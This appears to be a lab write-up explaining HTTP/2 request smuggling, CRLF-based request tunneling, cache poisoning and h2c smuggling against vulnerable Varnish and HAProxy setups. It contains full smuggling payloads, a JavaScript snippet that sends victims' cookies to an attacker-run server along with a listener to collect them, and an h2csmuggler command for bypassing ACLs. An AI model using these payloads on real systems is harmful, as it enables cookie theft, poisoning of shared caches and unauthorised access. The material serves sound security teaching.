# HTTP/2 Request Smuggling

HTTP/2 was designed to solve several limitations of HTTP/1.1 by changing how requests and responses are transmitted. Unlike HTTP/1.1, which uses human-readable text, HTTP/2 uses a binary protocol that is faster, more structured, and easier for machines to parse consistently.

Although HTTP/2 traffic is binary, simplified representations are commonly used for readability.

![img](/img/HTTP2RequestSmuggling/1.svg)

An HTTP/2 request contains:

* **Pseudo-headers:** Special headers beginning with `:` that are required for valid HTTP/2 requests, such as `:method`, `:path`, `:scheme`, `:authority`

* **Headers:** Standard HTTP headers such as `user-agent`, `content-length` (HTTP/2 header names are always lowercase.)

* **Request Body:** Contains POST data, uploaded files, or other request content.

**HTTP/2 and Request Smuggling:**

HTTP/1.1 request smuggling exists mainly because request boundaries can be defined in multiple ways using headers such as `Content-Length`, `Transfer-Encoding`

Different servers may interpret these headers differently, leading to desynchronization.

HTTP/2 attempts to eliminate this ambiguity by explicitly defining the size of each request component. Headers and body data are transmitted inside binary frames that include their own length fields.

Example from Wireshark:

![img](/img/HTTP2RequestSmuggling/2.png)

The `:method` pseudo-header includes:

* Header name length
* Header value length

Example:

* `:method` → length `7`
* `GET` → length `3`

Because HTTP/2 frames already define payload sizes, headers such as `Content-Length`, `Transfer-Encoding: chunked` are not required in pure HTTP/2 communication. Modern browsers may still include `Content-Length` headers to support HTTP downgrading scenarios, where an HTTP/2 front end communicates with an HTTP/1 back end. This becomes important in HTTP/2 request smuggling attacks.

In fully HTTP/2 environments, request smuggling is largely prevented due to strict framing rules. However, many real-world infrastructures still use:

* HTTP/2 on the front end
* HTTP/1.1 on the back end

This protocol translation layer can reintroduce parsing inconsistencies and create new request smuggling opportunities during HTTP/2 to HTTP/1 downgrading.

## 1. HTTP/2 Desync

HTTP/2 request smuggling mainly occurs in environments where:

* The front end communicates using HTTP/2
* The back end still uses HTTP/1.1

This process is called **HTTP/2 downgrading**.

In these environments, attackers do not directly exploit HTTP/2 parsing. Instead, they manipulate how the proxy converts HTTP/2 requests into HTTP/1.1 requests, causing a desynchronization condition in the back-end connection.

Ideally, one HTTP/2 request should translate cleanly into one HTTP/1.1 request. In practice, proxy implementations handle this conversion differently, making request smuggling possible.

### 1.1 HTTP/2 to HTTP/1.1 Translation

![img](/img/HTTP2RequestSmuggling/3.svg)

During downgrading:

* Headers are copied into the HTTP/1.1 request
* The body is forwarded unchanged
* The `:authority` pseudo-header is converted into the `Host` header

Although HTTP/2 does not require `Content-Length`, browsers often include it to support HTTP/1.1 downgrades.

Different proxies may place the generated `Host` header differently within the final request.

### 1.2 H2.CL

In H2.CL attacks:

* The attacker injects a `Content-Length` header into the HTTP/2 request
* The proxy forwards it to the HTTP/1.1 back end
* The back end trusts the injected `Content-Length`

Example:

![img](/img/HTTP2RequestSmuggling/4.svg)

If `Content-Length: 0` is injected, the back end assumes the request has no body.

The remaining HTTP/2 body data:

```txt
HELLO
```

remains in the back-end connection buffer and is interpreted as the beginning of the next request.

When another user sends a request, their request becomes concatenated with the leftover data:

![img](/img/HTTP2RequestSmuggling/5.svg)

This desynchronizes the connection and allows attackers to interfere with subsequent requests.

### 1.3 H2.TE

H2.TE works similarly, but uses: `Transfer-Encoding: chunked` instead of `Content-Length`.

Example:

![img](/img/HTTP2RequestSmuggling/6.svg)

If the back end prioritizes `Transfer-Encoding`, it processes the request as chunked data.

A chunk size of `0` marks the end of the request body, causing any remaining data to poison the back-end connection and affect the next request.

### 1.4 CRLF Injection

CRLF stands for:

* `\r` → Carriage Return (`0x0D`)
* `\n` → Line Feed (`0x0A`)

Combined: `\r\n`

HTTP/1.1 uses CRLF sequences:

* To separate headers
* To separate headers from the body

Since HTTP/2 supports binary data, attackers may inject CRLF characters into request fields. During HTTP/2 to HTTP/1.1 conversion, poorly sanitized input may be interpreted as actual header separators.

Example:

![img](/img/HTTP2RequestSmuggling/7.svg)

This can allow:

* Header injection
* Request smuggling
* Full request injection

CRLF injection is not limited to headers. Any user-controlled value that reaches the downgraded HTTP/1.1 request without proper sanitization may become exploitable.

### 1.5 Practical Example

This example demonstrates an H2.CL vulnerability in an older version of Varnish. The proxy reuses a single back-end connection for multiple users, allowing attackers to poison the connection and interfere with subsequent requests.

The application simulates a simple social network where users can:

* View their post
* Like or dislike posts

The goal is to force another user to like the attacker's post.

**Application Behavior:**

* The application uses a `sessid` cookie to identify users
* Likes are triggered through:

```http
GET /post/like/<post_id>
```

The application determines which user performed the action using the victim's `sessid` cookie.

**Smuggling Payload:**

```http
POST / HTTP/2
Host: 10.48.140.26:8000
Cookie: sessid=ba89f897ef7f68752abc
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Referer: https://10.48.140.26:8000/post/12315198742342
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

GET /post/like/12315198742342 HTTP/1.1
X: f
```

### 1.6 Attack Breakdown

The request is sent as:

```http
POST / HTTP/2
```

because a request body is required to smuggle additional data.

The injected header: `Content-Length: 0` causes the HTTP/1.1 back end to believe the POST request has no body.

Everything after the headers:

```http
GET /post/like/12315198742342 HTTP/1.1
X: f
```

remains in the back-end connection buffer as an incomplete request.

The fake header `X: f` is intentionally unfinished. The back end waits for additional data to complete the request.

When another user sends a request, their request line becomes appended to the smuggled payload:

![img](/img/HTTP2RequestSmuggling/8.svg)

As a result:

* The victim's request line becomes part of the `X:` header
* The original victim URL is ignored
* The back end processes:

```http
GET /post/like/12315198742342
```

using the victim's cookies

This causes the victim to unknowingly like the attacker's post.

### 1.7 Burp Suite Configuration

Capture an HTTP/2 request and send it to Repeater.

Modify the request until it matches the payload structure:

![img](/img/HTTP2RequestSmuggling/9.png)

Requirements:

* Ensure the request is sent as HTTP/2
* Disable: `Update Content-Length`

Otherwise, Burp will automatically recalculate the body size and break the payload.

![img](/img/HTTP2RequestSmuggling/10.png)

Important:
Do not leave extra newlines after `X: f`

The next incoming request line must be appended directly to the same line. Additional newlines would terminate the header and prevent the desynchronization from working.

## 2. HTTP/2 Request Tunneling: Leaking Internal Headers

Previous desync attacks relied on the backend reusing a single connection for multiple users. Some proxies prevent this by assigning separate backend connections per user, making it impossible to interfere with other users' requests.

In these cases, attackers can still smuggle requests within their own backend connection. This technique is called **request tunneling**.

This lab uses an older version of HAProxy vulnerable to `CVE-2019-19330`, which allows CRLF injection through HTTP/2 headers during HTTP/2 → HTTP/1.1 downgrading.

### 2.1 Leaking Internal Headers

Front-end proxies often add internal headers before forwarding requests to the backend. These may include:

* Internal routing information
* Authentication data
* Client IP addresses
* Proxy metadata

Leaking these headers helps attackers understand how backend requests are constructed.

In this lab, the `/hello` endpoint reflects the value of the `q` POST parameter in the response.

Example request:

![img](/img/HTTP2RequestSmuggling/11.svg)

During downgrading:

* `:authority` becomes the `Host` header
* Additional internal headers may also be inserted

Resulting backend request:

![img](/img/HTTP2RequestSmuggling/12.svg)

### CRLF Injection Attack

The attack injects CRLF characters (`\r\n`) through an attacker-controlled `Foo` header.

![img](/img/HTTP2RequestSmuggling/13.svg)

Since HTTP/2 accepts binary characters inside headers, HAProxy incorrectly converts the injected CRLFs into real HTTP/1.1 line breaks during downgrading. This allows the attacker to create new headers and even a second HTTP/1.1 request.

The injected `Content-Length: 0`

forces the backend to treat the first request as bodyless, while the remaining data becomes a smuggled second request.

A manual `Host` header is injected to ensure the first smuggled HTTP/1.1 request remains valid after CRLF-based request splitting. Although HAProxy generates a `Host` header from the HTTP/2 `:authority` pseudo-header during downgrading, the CRLF injection corrupts the request structure mid-serialization, making the final placement of the proxy-generated `Host` header unreliable. Injecting a `Host` header manually guarantees the split request is parsed correctly by the backend.

The second smuggled request `POST /hello HTTP/1.1` contains `q=`

When backend or proxy-added headers are appended after it, they become part of the reflected `q` parameter and leak back in the response.

### Why CRLF Injection Was Used Instead of a Normal H2.CL Payload

A normal H2.CL payload could theoretically smuggle a second request by placing it inside the HTTP/2 body after `Content-Length: 0`

Example:

```http
POST /hello HTTP/2
Host: target
Content-Length: 0

POST /hello HTTP/1.1
Host: target
...
```

Classic H2.CL attacks rely on the backend reinterpreting leftover HTTP/2 body bytes as a second HTTP/1.1 request.

This lab demonstrates a different issue: unsafe header serialization during HTTP/2 → HTTP/1.1 downgrading in HAProxy.

Instead of abusing leftover body data, the attack injects CRLF characters (`\r\n`) inside an attacker-controlled header (`Foo`). During downgrading, HAProxy converts HTTP/2 headers into raw HTTP/1.1 header bytes. Because the injected CRLF characters are not sanitized properly, they become real HTTP/1.1 line separators, allowing the attacker to create the beginning of a second HTTP/1.1 request directly inside the downgraded request.

The body-based H2.CL approach failed because HTTP/2 bodies are handled through DATA frames and stream semantics (`END_STREAM`). HAProxy correctly enforces these boundaries and does not reinterpret leftover DATA bytes as a new HTTP/1.1 request.

After the CRLF injection creates the second request, the attack still relies on classic desynchronization behavior. The smuggled request is intentionally incomplete, so the backend waits for more bytes. When another request is sent on the same backend connection, its bytes become appended to the unfinished request.

The `Foo` header itself is not special. It is simply an attacker-controlled header used to carry the injected CRLF characters.

### Burp Suite Setup

Capture a POST request to `/hello` and send it to Repeater.

Requirements:

1. Remove the request body
2. Set: `Content-Length: 0`
3. Disable `Update Content-Length`
4. Add a custom `Foo:` header

![img](/img/HTTP2RequestSmuggling/14.png)

CRLF characters cannot be edited reliably in the raw request editor.

Use the **Inspector** pane instead:

* Expand the `Foo` header
* Insert CRLF using `SHIFT + ENTER`

Final structure:

![img](/img/HTTP2RequestSmuggling/15.png)

After applying changes, Burp marks the request as `kettled`, meaning the request contains binary/special characters that cannot be represented cleanly as plain text. Further edits must be done through the Inspector.

### Sending the Request

The attack splits one HTTP/2 request into two HTTP/1.1 requests.

Because of this:

* The first response is usually empty
* The payload must be sent twice in quick succession
* The second response should contain the leaked internal headers

### Final Request Structure

The `Foo` header value must be injected through Burp Inspector.

```http
POST /hello HTTP/2
Host: 10.48.140.26:8100
Content-Length: 0
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Origin: https://10.48.140.26:8100
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://10.48.140.26:8100/hello
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Foo: 

bar
Host: 10.48.140.26:8100

POST /hello HTTP/1.1
Content-Length: 300
Host: 10.48.140.26:8100
Content-Type: application/x-www-form-urlencoded

q=
```

> The top `Host:` shown in Burp is actually the HTTP/2 `:authority` pseudo-header, not a real HTTP/1.1 `Host` header yet.
>
> During HTTP/2 → HTTP/1.1 downgrading, HAProxy converts `:authority` into a `Host` header. However, the CRLF injection inside the `Foo` header splits the request before HAProxy finishes constructing the downgraded request.
>
> As a result, the proxy-generated `Host` header may end up attached to the wrong request. A manual `Host` header is therefore injected to ensure the first smuggled HTTP/1.1 request remains valid.

## 3. HTTP/2 Request Tunneling: Bypassing Frontend Restrictions

Some front-end proxies restrict access to sensitive backend resources such as `/admin`. These restrictions are often enforced only at the proxy layer, while the backend itself still accepts direct requests.

Request tunneling can bypass these controls by smuggling a hidden backend request through an allowed frontend request.

Attempting to access `/admin` directly is blocked by the proxy:

![img](/img/HTTP2RequestSmuggling/16.png)

The attack sends a valid HTTP/2 request to an allowed endpoint such as `/hello`, while using CRLF injection to create a second hidden HTTP/1.1 request for `/admin` during HTTP/2 → HTTP/1.1 downgrading.

![img](/img/HTTP2RequestSmuggling/17.svg)

The frontend proxy only sees a request for `/hello`, so the ACL allows it. During downgrade, the injected CRLF characters split the request and create a second backend request targeting `/admin`.

This effectively tunnels a forbidden request through an allowed one.

The frontend validates the visible HTTP/2 request, while the backend processes the hidden downgraded HTTP/1.1 request.

`POST` is used instead of `GET` because proxies may serve `GET` requests from cache without forwarding them to the backend. `POST` requests are typically forwarded directly, making the attack more reliable.

The smuggled request is intentionally incomplete:

```http
GET /admin HTTP/1.1
X-Fake: a
```

The backend waits for additional bytes, so the payload usually needs to be sent twice. The second request completes the poisoned backend stream and triggers the `/admin` response.

### Launching the Attack With Burp

The `Foo` header value must be injected through Burp Inspector:

```http
POST /hello HTTP/2
Host: 10.48.140.26:8100
Content-Length: 0
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Origin: https://10.48.140.26:8100
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://10.48.140.26:8100/hello
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Foo: 

bar
Host: 10.48.140.26:8100

GET /admin HTTP/1.1
X-Fake: a
```

> `X-Fake: a` is not special. It is simply a dummy header used to keep the smuggled HTTP/1.1 request syntactically valid but intentionally incomplete. Since the request does not end with the required `\r\n\r\n`, the backend keeps waiting for more bytes, allowing the next request on the same backend connection to become appended to it.

## 4. HTTP/2 Request Tunneling: Web Cache Poisoning

Even without influencing other users' backend connections directly, request tunneling can still poison shared proxy caches and indirectly affect all users.

If a proxy caches a poisoned response for a legitimate URL, every user requesting that URL may receive attacker-controlled content until the cache expires.

> Cache poisoning through request tunneling abuses response desynchronization rather than direct request desynchronization.

**Note:** Cache poisoning on production systems can impact availability and affect all users. Test carefully.

### Understanding the Scenario

This lab uses HAProxy configured to cache content for 30 seconds.

The goal is to make the proxy associate `/static/text.js` with the contents of `/static/uploads/myjs.js`

The application provides an upload feature at `/upload`, allowing attacker-controlled files to be hosted on the website.

![img](/img/HTTP2RequestSmuggling/18.png)

The homepage loads:

```txt
/static/text.js
```

through the `showText()` JavaScript function:

![img](/img/HTTP2RequestSmuggling/19.png)

Instead of poisoning `/` directly, the attack targets `/static/text.js` to silently inject malicious JavaScript into all visitors.

### Uploading the Payload

Upload the following file as `myjs.js`:

```js
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
       document.getElementById("demo").innerHTML = xhttp.responseText;
    }
};
xhttp.open("GET", "https://10.48.75.133:8002/?c="+document.cookie, true);
xhttp.send();
```

The payload exfiltrates victim cookies to an attacker-controlled HTTPS server.

After uploading, the file becomes available at:

```txt
/static/uploads/myjs.js
```

HTTPS is required because browsers block insecure HTTP requests from HTTPS pages.

### Poisoning the Cache

The following request abuses CRLF injection to split the backend request stream. The `Foo` header value must be injected through Burp Inspector:

```http
GET /static/text.js HTTP/2
Host: 10.48.140.26:8100
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Pragma: no-cache
Foo:

bar
Host: 10.48.140.26:8100

GET /static/uploads/myjs.js HTTP/1.1
```

Attack flow:

1. Proxy receives a request for `/static/text.js`
2. CRLF injection creates a second backend request for `/static/uploads/myjs.js`
3. Backend sends two responses
4. Proxy serves the first response normally
5. The second response remains queued on the backend connection
6. A later request for `/static/text.js` receives the queued response instead
7. The proxy caches the malicious response under `/static/text.js`

As a result, all users requesting `/static/text.js` receive the attacker-controlled JavaScript.

`Pragma: no-cache` forces the proxy to bypass cached content during testing, ensuring requests always reach the backend.

### Verifying the Poisoned Cache

After poisoning succeeds:

```bash
user@attackbox$ curl -kv https://MACHINE_IP:8100/static/text.js
```

should return the contents of `myjs.js`.

> Avoid testing with normal browsers because local browser caching may interfere with results.

### Receiving Victim Cookies

When victims visit `/`, the poisoned `/static/text.js` executes and sends cookies to the attacker server over HTTPS.

Generate an SSL certificate:

```bash
user@attackbox$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -sha256 -days 3650 -nodes -subj "/C=XX/ST=StateName/L=CityName/O=CompanyName/OU=CompanySectionName/CN=CommonNameOrHostname"
```

Create `https.py`:

```py
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 8002), BaseHTTPRequestHandler)

context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain(certfile="cert.pem", keyfile="key.pem")

httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
httpd.serve_forever()
```

Run the HTTPS listener:

```bash
user@attackbox$ python3 https.py
```

When the victim loads the poisoned JavaScript, their cookies appear in the server logs.

## 5. h2c Smuggling

### HTTP Version Negotiation

Web servers can support multiple HTTP versions on the same port. During connection setup, the client and server negotiate which protocol to use.

HTTP/2 defines two negotiation methods:

* **h2** → HTTP/2 over TLS using ALPN negotiation
* **h2c** → HTTP/2 over cleartext connections using an HTTP/1.1 upgrade request

`h2` is the standard modern implementation. `h2c` is mostly obsolete and unsupported by modern browsers, but many backend servers still support it for compatibility.

### h2c Upgrades

To upgrade an HTTP/1.1 connection to HTTP/2 over cleartext, the client sends:

```http
Upgrade: h2c
HTTP2-Settings: ...
```

If the server accepts the upgrade, it responds with:

```http
101 Switching Protocols
```

The connection then switches from HTTP/1.1 to HTTP/2.

### h2c Smuggling

Some reverse proxies incorrectly forward `Upgrade: h2c` requests directly to the backend instead of handling them themselves.

If the backend accepts the upgrade:

* the backend connection becomes HTTP/2
* the proxy only tunnels traffic afterward
* the proxy stops inspecting future requests

This creates a direct HTTP/2 tunnel to the backend server, allowing attackers to bypass frontend restrictions. This technique is known as **h2c smuggling**.

Unlike classic request smuggling:

* this does **not** poison other users' connections
* it only creates a private tunnel to the backend
* mainly used for request tunneling and ACL bypasses

### h2c Over TLS

`h2c` is technically meant for cleartext connections only.

However, some proxies supporting HTTP/1.1 over TLS may incorrectly forward `Upgrade: h2c` even over HTTPS.

Since the request is unusual and invalid per specification, the proxy may avoid handling the upgrade itself and simply pass it to the backend, unintentionally creating the tunnel.

### Bypassing Frontend Restrictions

In this lab:

* `/` is allowed through the proxy
* `/private` is blocked with `403 Forbidden`

The attack:

1. Requests `/` while attempting an h2c upgrade
2. Backend upgrades the connection to HTTP/2
3. Subsequent HTTP/2 requests bypass frontend ACL checks
4. `/private` becomes accessible through the tunnel

### Using `h2csmuggler`

The tool below automates the attack:

```bash
user@attackbox$ python3 h2csmuggler.py -x https://10.48.140.26:8200/ https://10.48.140.26:8200/private
```

What it does:

* sends an h2c upgrade request to `/`
* establishes an HTTP/2 tunnel through the proxy
* uses that tunnel to request `/private`

The proxy only validates the initial `/` request. After the upgrade succeeds, later HTTP/2 traffic reaches the backend directly without frontend filtering.

You may need to run the command multiple times if the upgrade fails.

---
